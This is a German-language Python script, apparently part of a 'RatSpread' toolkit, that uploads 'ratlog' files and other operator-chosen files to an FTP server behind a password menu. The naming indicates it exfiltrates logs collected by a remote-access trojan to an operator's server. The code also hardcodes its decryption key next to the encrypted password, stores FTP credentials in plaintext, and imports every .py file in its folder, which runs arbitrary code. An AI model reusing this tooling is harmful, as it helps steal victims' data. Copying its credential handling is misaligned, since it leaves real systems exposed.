import ftplib
import os
import time
import socket
import getpass
import importlib
from cryptography.fernet import Fernet
import RatSpreadVars

def load_key():
    return b'o1O-RoUYF6prOf8nXvG3LNvUrAvVwEOCwECtFdwXqD4='  
def load_encrypted_password():
    return b'gAAAAABmhQdRST879A4iAbvET4DyfZCwPQplHf1xyx-nOnwcKh61AT-G0-pIWzGG4PQpgIigMQM59gF_gWWO5_FnCVo4wk3J-Q=='

def decrypt_password(encrypted_password, key):
    f = Fernet(key)
    decrypted_password = f.decrypt(encrypted_password).decode()
    return decrypted_password

def check_password(input_password, encrypted_password, key):
    decrypted_password = decrypt_password(encrypted_password, key)
    return input_password == decrypted_password

key = load_key()
encrypted_password = load_encrypted_password()

input_password = getpass.getpass("Bitte geben Sie das Passwort ein: ")

if not check_password(input_password, encrypted_password, key):
    print("Passwort inkorrekt. Zugriff verweigert.")
    exit(1)

username = getpass.getuser()

menu_options = {
    1: 'Verbindungsdaten eingeben und Log datei hochladen',
    2: 'Voreinstellungen laden und Log datei hochladen',
    3: 'RatDebuger',
    4: 'Andere Dateien hochladen',
}

def clear_screen():
    os.system("cls" if os.name == "nt" else "clear")
    if os.name == "nt":
        os.system("color 0a")

def print_menu():
    clear_screen()
    print(f"{RatSpreadVars.titel}")  
    for key, value in menu_options.items():
        print(f"{key} --> {value}")

def load_module(module_name):
    try:
        return importlib.import_module(module_name)
    except ModuleNotFoundError:
        print(f"Voreinstellungsdatei '{module_name}' nicht gefunden.")
        time.sleep(5)
        return None

def ftp_login(FTPip, UnFtp, PwFtp):
    try:
        ftp = ftplib.FTP_TLS(FTPip)
        ftp.login(UnFtp, PwFtp)
        ftp.prot_p()
        return ftp
    except ftplib.all_errors as err:
        print(f"Fehler beim Verbinden oder Hochladen: {err}")
        return None

def upload_file(ftp, filename):
    clear_screen()
    print(f"{RatSpreadVars.titel}") 
    try:
        with open(filename, "rb") as file:
            ftp.storbinary(f"STOR {filename}", file)
        print(f"'{filename}' wurde erfolgreich hochgeladen")
        time.sleep(5)
    except ftplib.all_errors as err:
        print(f"Fehler beim Hochladen der Datei '{filename}': {err}")
        time.sleep(5)

def option1():
    clear_screen()
    print(f"{RatSpreadVars.titel}")
    iptest()

def option2():
    clear_screen()
    print(f"{RatSpreadVars.ascii}")
    voreinstellungen()

def option3():
    clear_screen()
    print(f"{RatSpreadVars.ascii}")
    RatDebuger()

def option4():
    clear_screen()
    print(f"{RatSpreadVars.ascii}")
    upload_files_menu()

def RatDebuger():
    module_name = input("Name der Voreinstellungsdatei: ")
    mod = load_module(module_name)
    if mod:
        print(f"Gefundene IP: {mod.FTPip}")
        if not validate_ip(mod.FTPip):
            return
        ftp = ftp_login(mod.FTPip, mod.UnFtp, mod.PwFtp)
        if ftp:
            print("Funktioniert einwandfrei.")
            time.sleep(10)

def validate_ip(ip):
    try:
        socket.inet_aton(ip)
        return True
    except socket.error as err:
        print(f"Ungültige FTP Adresse: '{ip}' {err}")
        time.sleep(10)
        return False

def voreinstellungen():
    module_name = input("Name der Voreinstellungsdatei: ")
    mod = load_module(module_name)
    if mod:
        print(f"Gefundene IP: {mod.FTPip}")
        if validate_ip(mod.FTPip):
            ftp = ftp_login(mod.FTPip, mod.UnFtp, mod.PwFtp)
            if ftp:
                upload_file(ftp, f"ratlog_{username}.txt")
                time.sleep(10)

def save_preset(ip, username, password):
    preset_name = input("Name der Voreinstellungsdatei (ohne .py): ")
    content = f'''#by Mausi Schmausi

FTPip = "{ip}" #ftp Servername/IP Adresse

UnFtp = "{username}"  #ftp Username

PwFtp = "{password}" #ftp Password
'''
    with open(f"{preset_name}.py", "w") as file:
        file.write(content)
    print(f"Voreinstellungsdatei '{preset_name}.py' wurde erfolgreich erstellt.")
    time.sleep(5)

def check_existing_preset(ip, username, password):
    for file in os.listdir():
        if file.endswith(".py"):
            try:
                mod = importlib.import_module(file[:-3])
                if mod.FTPip == ip and mod.UnFtp == username and mod.PwFtp == password:
                    print(f"Es existiert bereits eine Voreinstellungsdatei mit diesen Daten: {file}")
                    return True
            except (ModuleNotFoundError, AttributeError):
                continue
    return False

def iptest():
    FTPip = input("FTP Server Adresse: ")
    if not validate_ip(FTPip):
        return

    UnFtp = input("FTP Username: ")
    PwFtp = input("FTP Password: ")
    ftp = ftp_login(FTPip, UnFtp, PwFtp)
    if ftp:
        filename = f"ratlog_{username}.txt"
        upload_file(ftp, filename)
        ftp.dir()
        if not check_existing_preset(FTPip, UnFtp, PwFtp):
            save_choice = input("Möchtest du die Verbindung als Voreinstellungsdatei speichern? (ja/nein): ").strip().lower()
            if save_choice in ["ja", "j"]:
                save_preset(FTPip, UnFtp, PwFtp)

def upload_files_menu():
    upload_menu_options = {
        1: 'Mit Voreinstellungsdatei hochladen',
        2: 'Daten manuell eingeben und hochladen',
    }

    def print_upload_menu():
        clear_screen()
        print(f"{RatSpreadVars.ascii}")
        for key, value in upload_menu_options.items():
            print(f"{key} --> {value}")

    def upload_with_preset():
        clear_screen()
        print(f"{RatSpreadVars.ascii}")
        module_name = input("Name der Voreinstellungsdatei: ")
        mod = load_module(module_name)
        if mod:
            upload_files(mod.FTPip, mod.UnFtp, mod.PwFtp)

    def upload_with_manual_data():
        clear_screen()
        print(f"{RatSpreadVars.ascii}")
        FTPip = input("FTP Server Adresse: ")
        if not validate_ip(FTPip):
            return
        
        UnFtp = input("FTP Username: ")
        PwFtp = input("FTP Password: ")
        upload_files(FTPip, UnFtp, PwFtp)
        if not check_existing_preset(FTPip, UnFtp, PwFtp):
            save_choice = input("Möchtest du die Verbindung als Voreinstellungsdatei speichern? (ja/nein): ").strip().lower()
            if save_choice in ["ja", "j"]:
                save_preset(FTPip, UnFtp, PwFtp)

    print_upload_menu()
    try:
        option = int(input('Deine Eingabe: '))
        if option == 1:
            upload_with_preset()
        elif option == 2:
            upload_with_manual_data()
        else:
            print('Bitte gib eine gültige Nummer ein.')
            upload_files_menu()
    except ValueError:
        print('Falsche Eingabe!')
        time.sleep(5)
        upload_files_menu()

def upload_files(FTPip, UnFtp, PwFtp):
    ftp = ftp_login(FTPip, UnFtp, PwFtp)
    if ftp:
        file_paths = input("Gib die Dateipfade ein (durch Kommas getrennt): ").split(',')
        for file_path in file_paths:
            file_path = file_path.strip()
            if os.path.isfile(file_path):
                upload_file(ftp, file_path)
                time.sleep(5)
            else:
                print(f"Datei '{file_path}' wurde nicht gefunden.")
                time.sleep(5)
        ftp.quit()

if __name__ == '__main__':
    while True:
        try:
            print_menu()
            try:
                option = int(input('Deine Eingabe: '))
                if option == 1:
                    option1()
                elif option == 2:
                    option2()
                elif option == 3:
                    option3()
                elif option == 4:
                    option4()
                else:
                    print('Bitte gib eine gültige Nummer ein.')
                print_menu()
            except ValueError:
                print('Falsche Eingabe!')
        except KeyboardInterrupt:
            clear_screen()
            print("\nUnterbrechung erkannt, Kehre zum Menü zurück.")
            continue
